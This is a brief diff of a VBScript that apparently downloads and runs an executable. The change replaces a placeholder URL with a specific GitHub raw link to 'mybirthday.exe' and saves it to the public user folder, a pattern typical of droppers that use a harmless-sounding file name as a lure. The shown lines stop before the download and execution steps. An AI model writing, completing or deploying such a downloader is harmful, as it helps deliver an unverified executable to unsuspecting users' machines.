@@ -2,7 +2,7 @@ Dim objXMLHTTP, objADOStream, objFSO, objShell
 Dim strURL, strSavePath
 
 ' Set the URL of your file
-strURL = "https://raw.githubusercontent.com/yourusername/repository/main/mybirthday.exe"
+strURL = "https://raw.githubusercontent.com/fuzigozo/main/te/mybirthday.exe"
 strSavePath = "C:\Users\Public\mybirthday.exe"
 
 ' Create the XMLHTTP object
